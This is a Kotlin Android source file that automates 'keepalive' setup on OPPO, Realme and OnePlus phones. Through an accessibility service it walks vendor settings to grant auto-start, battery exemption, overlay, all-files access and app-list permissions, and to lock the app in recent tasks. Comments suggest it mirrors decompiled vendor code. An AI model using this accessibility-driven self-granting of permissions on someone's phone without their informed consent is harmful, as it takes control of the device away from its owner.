package com.storm.safe.rock.service.modules.yw5xud.oppo

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.auto.condition.CombineFilter
import com.storm.safe.rock.auto.entity.UiNode
import com.storm.safe.rock.service.MyAccessibilityService
import kotlinx.coroutines.CancellationException
import com.storm.safe.rock.service.modules.yw5xud.VendorSteps

/**
 * OppoSteps -- OPPO/Realme/OnePlus (ColorOS/RealmeUI/OxygenOS) keepalive automation.
 * Matches vendor C0370a7 (a7, OppoStepsSimplified). Key flows:
 *
 * 1. Auto-start management (自启动管理)
 * 2. Battery optimization
 * 3. Background management (后台管理)
 * 4. All files access (MANAGE_EXTERNAL_STORAGE)
 *
 * This file is the orchestrator. Step implementations are in delegate classes:
 * - OppoStep1BasicPerms
 * - OppoStep2Battery
 * - OppoStep3AutoStart
 * - OppoStep4Overlay
 * - OppoStep56Misc (Step 5 + Step 6)
 * - OppoStep7Notification
 * - OppoStep8RecentTaskLock
 */
open class OppoSteps(
    service: MyAccessibilityService?,
    context: Context,
    ui: UiAutomation = UiAutomation(service, context)
) : VendorSteps(service, context, ui) {
    override val tag = "OppoSteps"

    companion object {
        private const val TAG = "OppoSteps"

        // ColorOS component names (with fallbacks for Realme/OnePlus)
        val AUTOSTART_COMPONENTS = listOf(
            ComponentName(
                "com.coloros.safecenter",
                "com.coloros.safecenter.startupapp.StartupAppListActivity"
            ),
            ComponentName(
                "com.oppo.safe",
                "com.oppo.safe.permission.startup.StartupAppListActivity"
            ),
            ComponentName(
                "com.coloros.safecenter",
                "com.coloros.safecenter.permission.startup.StartupAppListActivity"
            )
        )

        val BATTERY_COMPONENTS = listOf(
            ComponentName(
                "com.coloros.oppoguardelf",
                "com.coloros.powermanager.fuelgaue.PowerUsageModelActivity"
            ),
            ComponentName(
                "com.coloros.oppoguardelf",
                "com.coloros.powermanager.fuelgaue.PowerSaverModeActivity"
            ),
            ComponentName(
                "com.oplus.battery",
                "com.oplus.powermanager.fuelgaue.PowerUsageModelActivity"
            )
        )

        /** Keywords for auto-start toggle. */
        val AUTOSTART_KEYWORDS = listOf(
            "允许自启动", "自启动", "Allow auto-start", "Auto-start", "Autostart"
        )

        /** Keywords for battery no-restriction. */
        val BATTERY_KEYWORDS = listOf(
            "不优化", "无限制", "Don't optimize", "Unrestricted", "允许后台运行"
        )
    }

    // ━━━━━━━━━━━━━━━━━ Delegate 可见属性 ━━━━━━━━━━━━━━━━━

    /** 暴露 VendorSteps.context 给 delegate(VendorSteps.context 是 protected) */
    val ctx: Context get() = context

    /** 当前设备 SubBrand(vendor SubBrand ordinal 对齐) */
    open val subBrand: OppoSubBrand = OppoSubBrand.detect()

    // ━━━━━━━━━━━━━━━━━ Delegate 实例(lazy 初始化)━━━━━━━━━━━━━━━━━

    private val step1 by lazy { OppoStep1BasicPerms(service, ui, this) }
    private val step2 by lazy { OppoStep2Battery(service, ui, this) }
    private val step3 by lazy { OppoStep3AutoStart(service, ui, this) }
    private val step4 by lazy { OppoStep4Overlay(service, ui, this) }
    private val step56 by lazy { OppoStep56Misc(service, ui, this) }
    private val step7 by lazy { OppoStep7Notification(service, ui, this) }
    private val step8 by lazy { OppoStep8RecentTaskLock(service, ui, this) }

    // ━━━━━━━━━━━━━━━━━ execute 入口 ━━━━━━━━━━━━━━━━━

    override suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        executeAll(successes, failures, logs)
    }

    // ━━━━━━━━━━━━━━━━━ Legacy public helpers(保留兼容)━━━━━━━━━━━━━━━━━

    fun executeAutoStart(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = ui.launchComponent(AUTOSTART_COMPONENTS)
            if (launched) {
                logs.add("已启动ColorOS自启动管理")
                successes.add("OPPO自启动管理已打开")
            } else {
                failures.add("无法启动OPPO自启动管理")
            }
        } catch (e: Exception) {
            failures.add("OPPO自启动配置异常: ${e.message}")
        }
    }

    fun executeBatteryOptimization(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val launched = ui.launchComponent(BATTERY_COMPONENTS)
            if (launched) {
                logs.add("已启动ColorOS电池管理")
                successes.add("OPPO电池优化已打开")
            } else {
                val intent = Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                ).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
                logs.add("已发送电池优化豁免请求(标准)")
            }
        } catch (e: Exception) {
            failures.add("OPPO电池优化异常: ${e.message}")
        }
    }

    // ━━━━━━━━━━━━━━━━━ Step 委托方法(open 保留测试 override)━━━━━━━━━━━━━━━━━

    open suspend fun executeStep1BasicPermissions(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step1.execute(successes, failures, logs)

    open suspend fun executeStep2Battery(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step2.execute(successes, failures, logs)

    open suspend fun executeBatteryOppo(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step2.executeBatteryOppo(successes, failures, logs)

    open suspend fun executeBatteryRealme(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step2.executeBatteryRealme(successes, failures, logs)

    open suspend fun executeBatteryOnePlus(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step2.executeBatteryOnePlus(successes, failures, logs)

    open fun isIgnoringBatteryOptimizationsNow(): Boolean = step2.isIgnoringBatteryOptimizationsNow()

    open suspend fun executeStep3AutoStart(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step3.execute(successes, failures, logs)

    open suspend fun runAutoStartSubSwitch(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step3.runAutoStartSubSwitch(successes, failures, logs)

    open suspend fun tryOpenAutoStartViaSettings(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step3.tryOpenAutoStartViaSettings(successes, failures, logs)

    open suspend fun tryOpenAutoStartViaSafeCenter(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step3.tryOpenAutoStartViaSafeCenter(successes, failures, logs)

    open suspend fun runBackgroundSubSwitch(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step3.runBackgroundSubSwitch(successes, failures, logs)

    open suspend fun executeStep4Overlay(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step4.execute(successes, failures, logs)

    open fun canDrawOverlaysNow(): Boolean = step4.canDrawOverlaysNow()

    open suspend fun executeStep5AppList(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step56.executeStep5(successes, failures, logs)

    open fun hasQueryAllPackagesPermission(): Boolean = step56.hasQueryAllPackagesPermission()

    open suspend fun tryOpenAppListSwitch(
        successes: MutableList<String>,
        logs: MutableList<String>
    ) = step56.tryOpenAppListSwitch(successes, logs)

    open suspend fun executeStep6FileAccess(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step56.executeStep6(successes, failures, logs)

    open fun isExternalStorageManagerNow(): Boolean = step56.isExternalStorageManagerNow()

    open suspend fun launchFileAccessSettings() = step56.launchFileAccessSettings()

    open suspend fun tryToggleFileAccess(
        successes: MutableList<String>,
        logs: MutableList<String>
    ) = step56.tryToggleFileAccess(successes, logs)

    open suspend fun executeStep7Notification(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step7.execute(successes, failures, logs)

    open suspend fun areAppNotificationsBlocked(): Boolean = step7.areAppNotificationsBlocked()

    open suspend fun launchChannelSettings(channelId: String) = step7.launchChannelSettings(channelId)

    open suspend fun tryCloseOffChannelSwitch(
        successes: MutableList<String>,
        logs: MutableList<String>
    ) = step7.tryCloseOffChannelSwitch(successes, logs)

    open suspend fun executeStep8RecentTaskLock(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) = step8.execute(successes, failures, logs)

    open suspend fun tryLockAppCard(
        successes: MutableList<String>,
        logs: MutableList<String>
    ) = step8.tryLockAppCard(successes, logs)

    // ━━━━━━━━━━━━━━━━━ Step 9 -- 返回桌面(太短不值得单独文件)━━━━━━━━━━━━━━━━━

    open suspend fun executeStep9ReturnHome(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        val svc = service ?: run { failures.add("[Step 9/9] service=null"); return }
        try {
            svc.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
            successes.add("[Step 9/9] 返回桌面完成")
            logs.add("[Step 9/9] ✓ performGlobalAction(HOME)")
        } catch (e: CancellationException) { throw e } catch (e: Exception) {
            failures.add("[Step 9/9] HOME 触发异常: ${e.message}")
        }
    }

    // ━━━━━━━━━━━━━━━━━ OPPO-specific helpers ━━━━━━━━━━━━━━━━━

    /** 诊断:dump 当前 AccessibilityService 看到的页面结构到 logcat */
    internal fun dumpCurrentPage(stepTag: String) {
        try {
            val rootInfo = ui.root() ?: run { Log.w(TAG, "[$stepTag] dump: root=null"); return }
            val root = UiNode.createRoot(rootInfo) ?: run { Log.w(TAG, "[$stepTag] dump: UiNode=null"); return }
            val pkg = root.packageName ?: "?"
            val cls = (root.className ?: "?").substringAfterLast('.')
            val scrollNode = root.findOneByCombine(CombineFilter.scrollable())
            val scrollInfo = scrollNode?.let {
                "${(it.className ?: "?").substringAfterLast('.')}(scrollable=true)"
            } ?: "none"

            val allTexts = root.findAllByCombine { it.text.isNotEmpty() && it.text.length < 30 }
            val texts = allTexts.take(20).map { it.text }

            val svc = service
            val winSb = StringBuilder()
            try {
                val wins = svc?.windows
                winSb.append("wins=${wins?.size ?: 0}:")
                wins?.forEach { w ->
                    val wr = try { w.root } catch (_: Exception) { null }
                    val wp = wr?.packageName?.toString() ?: "null"
                    winSb.append(" [$wp]")
                }
            } catch (_: Exception) { winSb.append("err") }

            Log.i(TAG, "[$stepTag] ┌─ DUMP pkg=$pkg root=$cls scroll=$scrollInfo $winSb")
            Log.i(TAG, "[$stepTag] └─ texts=${texts.joinToString(" | ")}")
        } catch (e: Exception) {
            Log.w(TAG, "[$stepTag] dump 异常: ${e.message}")
        }
    }

    // ━━━━━━━━━━━━━━━━━ executeAll 编排 ━━━━━━━━━━━━━━━━━

    /**
     * OPPO executeAll -- 9 Step 整合编排。
     *
     * 对齐 vendor `OppoStepsSimplified.m212321b9` execute() 29 状态协程。
     * 每步 try/catch 隔离,CancellationException 重抛(cooperative cancel);
     * 其他 Exception 加入 failures,不中断后续 step。
     */
    open suspend fun executeAll(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (service == null) {
            failures.add("OppoSteps: service 未绑定,跳过全部 step")
            return
        }
        logs.add("╔══════════ OppoSteps.executeAll 开始(subBrand=$subBrand) ══════════")

        runStep("Step1-BasicPermissions", failures) { executeStep1BasicPermissions(successes, failures, logs) }
        runStep("Step2-Battery", failures) { executeStep2Battery(successes, failures, logs) }
        runStep("Step3-AutoStart", failures) { executeStep3AutoStart(successes, failures, logs) }
        runStep("Step4-Overlay", failures) { executeStep4Overlay(successes, failures, logs) }
        runStep("Step5-AppList", failures) { executeStep5AppList(successes, failures, logs) }
        runStep("Step6-FileAccess", failures) { executeStep6FileAccess(successes, failures, logs) }
        runStep("Step7-Notification", failures) { executeStep7Notification(successes, failures, logs) }
        runStep("Step8-RecentTaskLock", failures) { executeStep8RecentTaskLock(successes, failures, logs) }
        runStep("Step9-ReturnHome", failures) { executeStep9ReturnHome(successes, failures, logs) }

        logs.add("║ success=${successes.size} failure=${failures.size}")
        logs.add("╚══════════ OppoSteps.executeAll 完成 ══════════")
    }
}
